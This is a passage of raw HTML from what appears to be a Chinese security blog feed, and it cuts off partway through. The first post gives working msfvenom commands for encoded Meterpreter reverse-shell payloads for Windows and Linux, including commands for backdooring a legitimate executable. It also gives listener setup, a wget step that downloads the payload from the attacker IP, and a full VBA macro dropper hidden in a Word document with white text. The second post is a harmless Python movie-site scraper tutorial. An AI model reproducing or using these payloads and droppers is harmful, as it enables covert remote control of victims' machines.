class="hljs-string">&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 10 -f exe -o /</span>var<span class="hljs-regexp">/www/</span>html/vip.exe<br>二次编码：<br>msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">60.128</span> LPORT=<span class="hljs-number">4444</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/</span>alpha_upper -i <span class="hljs-number">10</span> -f exe -o <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>vip1.exe<br><br>-a 操作系统架构 <span class="hljs-number">32</span>位x86 <span class="hljs-number">64</span>位x64<br>--platform 操作系统<br>-p payload<br>-b 去掉坏字符 \x代表<span class="hljs-number">16</span>进制 <span class="hljs-number">00</span> 代表空字符<br>-e 指定编码器<br>-i 编码次数<br>-f 指定文件类型<br>-o 指定文件输出位置<br></code></pre></td></tr></table></figure><img src="/img/image-20230904193901605.png" alt="image-20230904193901605" style="zoom:80%;" /><p>开启apache服务</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">service</span> apache2 start <br>service apache2 status<br>靶机访问<span class="hljs-number">10.210.100.128</span>/vip.exe下载即可<br></code></pre></td></tr></table></figure><img src="/img/image-20230904194003154.png" alt="image-20230904194003154" style="zoom:80%;" /><img src="/img/image-20230904194053092.png" alt="image-20230904194053092" style="zoom:80%;" /><p>攻击机开启监听：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">msfconsole<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.210.100.128</span><br>run<br></code></pre></td></tr></table></figure><img src="/img/image-20230904194207115.png" alt="image-20230904194207115" style="zoom:80%;" /><h3 id="给软件加上后门"><a href="#给软件加上后门" class="headerlink" title="给软件加上后门"></a>给软件加上后门</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span> LPORT=<span class="hljs-number">4444</span> -<span class="hljs-string">b&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /</span>var<span class="hljs-regexp">/www/</span>html/QvodTerminal.exe<br><br>-x 以某个程序为模板<br></code></pre></td></tr></table></figure><img src="/img/image-20230904200039369.png" alt="image-20230904200039369" style="zoom:67%;" /><p>主程序启动–&gt;子程序伴随启动–&gt;绑定子程序 QvodTerminal.exe</p><img src="/img/image-20230904200137580.png" alt="image-20230904200137580" style="zoom:67%;" /><p>开启监听然后 启动主程序即可</p><h3 id="制作linux恶意程序"><a href="#制作linux恶意程序" class="headerlink" title="制作linux恶意程序"></a>制作linux恶意程序</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x64 --platform linux -p linux<span class="hljs-regexp">/x64/m</span>eterpreter<span class="hljs-regexp">/reverse_tcp LHOST=10.210.100.128 LPORT=4444 -b &quot;\x00&quot; -i 10 -f elf -o /</span>var<span class="hljs-regexp">/www/</span>html/linux_test<br><br>use exploit<span class="hljs-regexp">/multi/</span>handler<br>set payload linux<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp<br>set LHOST <span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span><br><br>靶机下载：wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span>/linux_test<br>执行./linux_test<br></code></pre></td></tr></table></figure><img src="/img/image-20230904203151407.png" alt="image-20230904203151407" style="zoom:67%;" /><h3 id="利用宏感染word文档"><a href="#利用宏感染word文档" class="headerlink" title="利用宏感染word文档"></a>利用宏感染word文档</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe<br></code></pre></td></tr></table></figure><img src="/img/image-20230904203500417.png" alt="image-20230904203500417" style="zoom:67%;" /><img src="/img/image-20230904203520730.png" alt="image-20230904203520730" style="zoom:67%;" /><h4 id="1-复制宏代码"><a href="#1-复制宏代码" class="headerlink" title="1.复制宏代码"></a>1.复制宏代码</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">恶意代码：<br><br><span class="hljs-variable">Sub</span> <span class="hljs-type">Auto_Open</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Ictso12</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br><br><span class="hljs-variable">Sub</span> <span class="hljs-variable">Ictso12</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso7</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso1</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso2</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso3</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso4</span> <span class="hljs-variable">As</span> <span class="hljs-variable">Paragraph</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso8</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso9</span> <span class="hljs-variable">As</span> <span class="hljs-variable">Boolean</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso5</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso11</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso6</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Byte</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ibhtnqbyoj</span> <span class="hljs-variable">as</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Ibhtnqbyoj</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Ibhtnqbyoj&quot;</span><br>        <span class="hljs-variable">Ictso1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mROEolRuRE.exe&quot;</span><br>        <span class="hljs-variable">Ictso2</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Environ</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;USERPROFILE&quot;</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">ChDrive</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso2</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">ChDir</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso2</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Ictso3</span> <span class="hljs-operator">=</span> <span class="hljs-variable">FreeFile</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-built_in">Open</span> <span class="hljs-variable">Ictso1</span> <span class="hljs-built_in">For</span> <span class="hljs-variable">Binary</span> <span class="hljs-variable">As</span> <span class="hljs-variable">Ictso3</span><br>        <span class="hljs-built_in">For</span> <span class="hljs-variable">Each</span> <span class="hljs-variable">Ictso4</span> <span class="hljs-variable">in</span> <span class="hljs-variable">ActiveDocument</span><span class="hljs-operator">.</span><span class="hljs-variable">Paragraphs</span><br>                <span class="hljs-variable">DoEvents</span><br>                        <span class="hljs-variable">Ictso11</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Ictso4</span><span class="hljs-operator">.</span><span class="hljs-built_in">Range</span><span class="hljs-operator">.</span><span class="hljs-built_in">Text</span><br>                <span class="hljs-built_in">If</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso9</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">True</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">Then</span><br>                        <span class="hljs-variable">Ictso8</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>                        <span class="hljs-built_in">While</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso8</span> <span class="hljs-operator">&lt;</span> <span class="hljs-variable">Len</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso11</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><br>                                <span class="hljs-variable">Ictso6</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Mid</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso11</span><span class="hljs-operator">,</span><span class="hljs-variable">Ictso8</span><span class="hljs-operator">,</span><span class="hljs-number">4</span><span class="hljs-punctuation">)</span><br>                                <span class="hljs-built_in">Put</span> <span class="hljs-type">#Ictso3</span><span class="hljs-operator">,</span> <span class="hljs-operator">,</span> <span class="hljs-variable">Ictso6</span><br>                                <span class="hljs-variable">Ictso8</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Ictso8</span> <span class="hljs-operator">+</span> <span class="hljs-number">4</span><br>                        <span class="hljs-variable">Wend</span><br>                <span class="hljs-variable">ElseIf</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">InStr</span><span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-operator">,</span><span class="hljs-variable">Ictso11</span><span class="hljs-operator">,</span><span class="hljs-variable">Ibhtnqbyoj</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-built_in">And</span> <span class="hljs-variable">Len</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso11</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">Then</span><br>                        <span class="hljs-variable">Ictso9</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">True</span><br>                <span class="hljs-built_in">End</span> <span class="hljs-built_in">If</span><br>        <span class="hljs-built_in">Next</span><br>        <span class="hljs-built_in">Close</span> <span class="hljs-type">#Ictso3</span><br>        <span class="hljs-variable">Ictso13</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso1</span><span class="hljs-punctuation">)</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br><br><span class="hljs-variable">Sub</span> <span class="hljs-variable">Ictso13</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso10</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso7</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">Integer</span><br>        <span class="hljs-variable">Dim</span> <span class="hljs-variable">Ictso2</span> <span class="hljs-variable">As</span> <span class="hljs-built_in">String</span><br>        <span class="hljs-variable">Ictso2</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Environ</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;USERPROFILE&quot;</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">ChDrive</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso2</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">ChDir</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso2</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-variable">Ictso7</span> <span class="hljs-operator">=</span> <span class="hljs-variable">Shell</span><span class="hljs-punctuation">(</span><span class="hljs-variable">Ictso10</span><span class="hljs-operator">,</span> <span class="hljs-variable">vbHide</span><span class="hljs-punctuation">)</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br><br><span class="hljs-variable">Sub</span> <span class="hljs-variable">AutoOpen</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-type">Auto_Open</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br><br><span class="hljs-variable">Sub</span> <span class="hljs-type">Workbook_Open</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br>        <span class="hljs-type">Auto_Open</span><br><span class="hljs-built_in">End</span> <span class="hljs-variable">Sub</span><br></code></pre></td></tr></table></figure><p>创建宏：</p><img src="/img/image-20230904203833597.png" alt="image-20230904203833597" style="zoom:67%;" /><p>粘贴msf生成的代码：</p><img src="/img/image-20230904203922388.png" alt="image-20230904203922388" style="zoom:67%;" /><p>保存为启用宏的文档：</p><img src="/img/image-20230904204054209.png" alt="image-20230904204054209" style="zoom:67%;" /><h4 id="2-复制payload"><a href="#2-复制payload" class="headerlink" title="2.复制payload"></a>2.复制payload</h4><img src="/img/image-20230904204246387.png" alt="image-20230904204246387" style="zoom:67%;" /><p>复制到word文档正文中</p><img src="/img/image-20230904204312614.png" alt="image-20230904204312614" style="zoom:67%;" /><p>将字体调成白色即可</p><h4 id="3-监听"><a href="#3-监听" class="headerlink" title="3.监听"></a>3.监听</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.210.100.128</span><br>run<br></code></pre></td></tr></table></figure><p>打开文档 – 启用宏</p><img src="/img/image-20230904204543498.png" alt="image-20230904204543498" style="zoom:67%;" />]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫小项目1</title>
    <link href="/2023/10/07/%E7%88%AC%E8%99%AB%E5%B0%8F%E9%A1%B9%E7%9B%AE1/"/>
    <url>/2023/10/07/%E7%88%AC%E8%99%AB%E5%B0%8F%E9%A1%B9%E7%9B%AE1/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫小项目：爬取https-ssr1-scrape-center"><a href="#爬虫小项目：爬取https-ssr1-scrape-center" class="headerlink" title="爬虫小项目：爬取https://ssr1.scrape.center/"></a>爬虫小项目：爬取<a href="https://ssr1.scrape.center/">https://ssr1.scrape.center/</a></h1><p><img src="/img/image-20230929172430337.png" alt="image-20230929172430337"></p><p><img src="/img/image-20230929172522452.png" alt="image-20230929172522452"></p><h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a><strong>目标：</strong></h2><p>1.按列表顺序爬取每个电影详情页</p><p>2.利用正则提取海报、名称、类别、上映时间、评分、剧情简介</p><p>3.将爬取的内容保存下来</p><h2 id="网页分析："><a href="#网页分析：" class="headerlink" title="网页分析："></a><strong>网页分析：</strong></h2><p><img src="/img/image-20230930145223731.png" alt="image-20230930145223731"></p><p>海报和标题都有跳转到详情页的链接&#x2F;detail&#x2F;1</p><p><img src="/img/image-20230930145514680.png" alt="image-20230930145514680"></p><p>页码url为&#x2F;page&#x2F;3    一共10页</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a><strong>实现</strong></h2><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-number">1.</span>遍历所有页码，拼接<span class="hljs-built_in">url</span><br><span class="hljs-number">2.</span>拿到详情页页面的<span class="hljs-built_in">url</span><br><span class="hljs-number">3.</span>在详情页面用正则匹配出需要的内容<br><span class="hljs-number">4</span>，保存数据<br></code></pre></td></tr></table></figure><p>需要匹配详情页的标签：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">data-v-7f856186</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;/detail/1&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">data-v-7f856186</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;/detail/2&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;/a&gt;<br><br>正则：<br>&lt;a.*<span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;(.*?)&quot;</span>.*?class=&quot;name&quot;&gt;<br></code></pre></td></tr></table></figure><p>非贪婪模式：</p><img src="/img/image-20230930154636668.png" alt="image-20230930154636668" style="zoom:67%;" /><h3 id="第一步：获取到所有的详情页链接"><a href="#第一步：获取到所有的详情页链接" class="headerlink" title="第一步：获取到所有的详情页链接"></a>第一步：获取到所有的详情页链接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一页面的内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,TOTAL_PAGE+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment">#抓取某个页面的内容</span><br>        index_html = scrape_index(page)<br>        <span class="hljs-comment">#抓取该页面上跳转详情页的链接</span><br>        details_urls = parse_index(index_html)<br>        <span class="hljs-comment">#print(list(details_urls))</span><br>        logging.info(<span class="hljs-string">&quot;详情页面链接%s&quot;</span>,<span class="hljs-built_in">list</span>(details_urls))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930161236158.png" alt="image-20230930161236158"></p><h3 id="第二步：爬取详情页信息"><a href="#第二步：爬取详情页信息" class="headerlink" title="第二步：爬取详情页信息"></a>第二步：爬取详情页信息</h3><p>分析：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>图片：img标签<br><span class="hljs-number">2.</span>类别：两个button里的span标签<br><span class="hljs-number">3.</span>上映时间：div里的span标签<br><span class="hljs-number">4.</span>评分：p标签<br><span class="hljs-number">5.</span>剧情简介：div <span class="hljs-keyword">class</span>=<span class="hljs-symbol">drama</span>里的<span class="hljs-symbol">p</span>标签<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930163136158.png" alt="image-20230930163136158"></p><p>正则测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-comment">#1.url</span><br><span class="hljs-comment"># txt = &#x27;&lt;img data-v-63864230=&quot;&quot; src=&quot;https://p0.meituan.net/movie/ce4da3e03e655b5b88ed31b5cd7896cf62472.jpg@464w_644h_1e_1c&quot; class=&quot;cover&quot;&gt;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1).split(&#x27;@&#x27;)</span><br><span class="hljs-comment"># print(response[0])</span><br><br><span class="hljs-comment">#2.种类</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     &lt;div data-v-63864230=&quot;&quot; class=&quot;categories&quot;&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;button data-v-7f856186=&quot;&quot; type=&quot;button&quot; class=&quot;el-button category el-button--primary el-button--mini&quot;&gt;</span><br><span class="hljs-comment">#                   &lt;span&gt;剧情&lt;/span&gt;</span><br><span class="hljs-comment">#                 &lt;/button&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;button data-v-7f856186=&quot;&quot; type=&quot;button&quot; class=&quot;el-button category el-button--primary el-button--mini&quot;&gt;</span><br><span class="hljs-comment">#                   &lt;span&gt;爱情&lt;/span&gt;</span><br><span class="hljs-comment">#                 &lt;/button&gt;</span><br>                <br><span class="hljs-comment">#               &lt;/div&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># #注意这里要加上re.S  .任意匹配  包括换行符</span><br><span class="hljs-comment"># #因为.是匹配除了换行符之外的任意字符</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.findall(pattern,txt)</span><br><span class="hljs-comment"># 